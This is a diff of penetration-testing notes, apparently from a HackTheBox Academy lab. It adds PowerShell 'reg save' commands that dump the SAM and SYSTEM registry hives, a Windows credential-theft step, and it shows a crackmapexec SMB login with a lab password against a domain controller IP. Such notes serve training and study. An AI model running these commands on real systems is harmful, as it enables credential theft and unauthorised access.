@@ -22,6 +22,12 @@ sc start AppReadiness
 net localgroup Administrators
 ```
 
+# Dump SAM and SECURITY
+```powershell
+reg save HKLM\SAM C:\Tools\sam.hiv
+reg save HKLM\SYSTEM C:\Tools\system.hiv
+```
+
 # Confirming Local Admin Access on Domain Controller
 ```powershell
 crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
